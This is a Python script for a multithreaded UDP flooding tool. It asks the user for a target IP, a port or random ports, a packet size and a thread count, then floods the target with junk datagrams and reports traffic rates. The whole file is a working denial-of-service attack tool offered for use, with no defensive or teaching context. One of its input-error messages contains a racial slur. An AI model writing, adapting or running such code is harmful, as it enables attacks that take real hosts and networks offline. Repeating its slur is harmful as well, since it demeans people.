from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep
from pystyle import *
from getpass import getpass as hinput

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break
            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"{round(size)} MB/S - TOTAL TRAFFIC : {round(self.total, 1)} GB."), end='\r')
            now2 = time()
            if now + 1 >= now2:
                continue
            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self.port or randint(1, 65535)))
                self.sent += self.len
            except:
                pass

def stage(text, symbol='...'):
    return f" {Col.Symbol(symbol, Col.white, Col.purple, '{', '}')} {Col.white}{text}"

def error(text):
    hinput(f"\n {Col.Symbol('!', Col.light_red, Col.white)} {Col.light_red}{text}")

def main():
    while True:
        ip = input(stage(f"ENTER IP {purple}->{fluo2} ", '?'))
        try:
            if ip.count('.') != 3 or not all(0 <= int(octet) <= 255 for octet in ip.split('.')):
                raise ValueError
        except:
            error("DUMBASS NIGGA ENTER CORRECT IP")
            continue

        port = input(stage(f"ENTER PORT [{fluo2}ENTER{white} FOR ALL] {purple}->{fluo2} ", '?'))
        port = int(port) if port.isdigit() and 1 <= int(port) <= 65535 else None

        force = input(stage(f"ENTER BPS [{fluo2}1250{white}] {purple}->{fluo2} ", '?'))
        force = int(force) if force.isdigit() else 1250

        threads = input(stage(f"ENTER THREADS [{fluo2}100{white}] {purple}->{fluo2} ", '?'))
        threads = int(threads) if threads.isdigit() else 100

        print(stage(f"STARTING ATTACK ON {fluo2}{ip}{f':{port}' if port else ''}{white}.", '.'))

        brute = Brutalize(ip, port, force, threads)
        try:
            brute.flood()
            while True:
                sleep(1000000)
        except KeyboardInterrupt:
            brute.stop()
            print(stage(f"ATTACK WAS STOPPED. {fluo2}{ip}{f':{port}' if port else ''}{white} ", '.'))

        print("\n")
        hinput(stage(f"PRESS {fluo2}enter{white} TO INPUT AONTHER IP.", '.'))

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white
purple = Col.StaticMIX((Col.purple, Col.black))

if __name__ == '__main__':
    main()